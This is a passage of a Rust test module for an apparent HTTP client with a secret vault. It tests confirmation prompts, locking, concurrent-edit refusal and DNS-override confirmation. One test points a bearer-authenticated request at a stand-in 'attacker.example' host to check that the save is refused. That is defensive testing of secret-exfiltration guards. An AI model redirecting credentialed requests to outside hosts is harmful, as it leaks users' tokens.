        save_tls_profile(&f.st, &unasked, tls_profile(f.ws, "Unused TLS", false)).await.unwrap();

        let mut renamed_proxy = proxy;
        renamed_proxy.name = "Corporate Proxy".into();
        save_proxy_profile(&f.st, &unasked, renamed_proxy).await.unwrap();
        save_proxy_profile(&f.st, &unasked, proxy_profile(f.ws, "Unused Proxy", "127.0.0.1:9999")).await.unwrap();

        // 8. Creating a request with no vault authority in a workspace without vault authority does not prompt.
        let plain_ws = f.app.create_workspace("Public").unwrap().meta.id;
        let mut plain_spec = RequestSpec::http("GET", "http://127.0.0.1:8080/health");
        plain_spec.auth = AuthConfig::None;
        create_request(&f.st, &unasked, plain_ws, None, "health".into(), plain_spec).await.unwrap();

        assert_eq!(unasked.times(), 0, "ordinary edits must never prompt: {:?}", unasked.asked.lock());
    }

    #[tokio::test]
    async fn lock_or_concurrent_mutation_during_confirmation_refuses_save() {
        let f = fixture();
        let mut spec = RequestSpec::http("GET", "https://shop.example/v1");
        spec.auth = bearer(&f.secret);
        let saved = f.app.create_request(&f.ws, None, "shop", spec).unwrap();

        // Concurrent mutation while the dialog is open changes the binding delta -> refused.
        let mut moved = saved.clone();
        moved.spec.url = "https://new-a.example/v1".into();
        let app_for_race = f.app.clone();
        let race_saved = saved.clone();
        let race = Answer::with(true, move || {
            let mut other = race_saved.clone();
            other.spec.url = "https://other.example/v1".into();
            app_for_race.save_request(other).unwrap();
        });
        assert_eq!(save_request(&f.st, &race, moved).await, Err(CHANGED_MEANWHILE.to_string()));
        assert_eq!(f.app.request(&saved.meta.id).unwrap().spec.url, "https://other.example/v1");

        // Lock while dialog is open -> refused with LOCKED.
        let mut moved_again = f.app.request(&saved.meta.id).unwrap();
        moved_again.spec.url = "https://attacker.example/v1".into();
        let lock_during = Answer::with(true, || f.st.lock());
        assert_eq!(save_request(&f.st, &lock_during, moved_again.clone()).await, Err("LOCKED".to_string()));

        // Locked profile refuses all mutations without prompting.
        let yes = Answer::yes();
        assert_eq!(
            create_request(&f.st, &yes, f.ws, None, "x".into(), RequestSpec::http("GET", "https://a.example")).await,
            Err("LOCKED".into())
        );
        assert_eq!(save_request(&f.st, &yes, moved_again).await, Err("LOCKED".into()));
        assert_eq!(yes.times(), 0);
    }

    #[tokio::test]
    async fn app_settings_defaults_dns_override_requires_confirmation() {
        let f = fixture();
        let mut spec = RequestSpec::http("GET", "https://shop.example/v1");
        spec.auth = bearer(&f.secret);
        f.app.create_request(&f.ws, None, "shop", spec).unwrap();

        let mut next = f.app.settings().unwrap();
        next.defaults.dns_overrides.push(DnsOverride { host: "shop.example".into(), addresses: vec!["127.0.0.1".into()] });
        let no = Answer::no();
        assert_eq!(crate::presence::save_settings(&f.st, &no, next.clone()).await, Err(NOT_CONFIRMED.to_string()));
        assert_eq!(no.times(), 1);
        assert!(f.app.settings().unwrap().defaults.dns_overrides.is_empty());

        let yes = Answer::yes();
        crate::presence::save_settings(&f.st, &yes, next).await.unwrap();
        assert_eq!(yes.times(), 1);
        assert_eq!(f.app.settings().unwrap().defaults.dns_overrides.len(), 1);
    }
}
